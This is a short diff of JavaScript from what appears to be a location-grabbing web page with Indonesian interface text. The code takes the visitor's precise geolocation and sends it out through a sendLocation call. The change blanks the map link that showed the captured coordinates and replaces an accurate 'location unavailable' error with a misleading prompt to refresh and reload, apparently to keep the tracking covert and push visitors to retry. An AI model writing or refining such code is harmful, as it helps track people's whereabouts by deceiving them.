@@ -84,7 +84,7 @@
         const result = await sendLocation(latitude, longitude, accuracy);
         if (result.ok) {
           setStatus('Silahkan Buka di Browser Lain');
-          const gmaps = `https://maps.google.com/?q=${latitude},${longitude}`;
+          const gmaps = `.......`;
           mapUrl.href = gmaps;
           mapUrl.textContent = '';
           mapWrap.style.display = 'block';
@@ -95,7 +95,7 @@
         setStatus('Gagal jaringan');
       }
     }, (err) => {
-      const msg = {1:'Izin ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal mendapatkan lokasi.';
+      const msg = {1:'Izin ditolak.',2:'Refresh Browser dan Muat Ulang.',3:'Timeout'}[err.code] || 'Gagal akses.';
       setStatus(msg);
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
   }
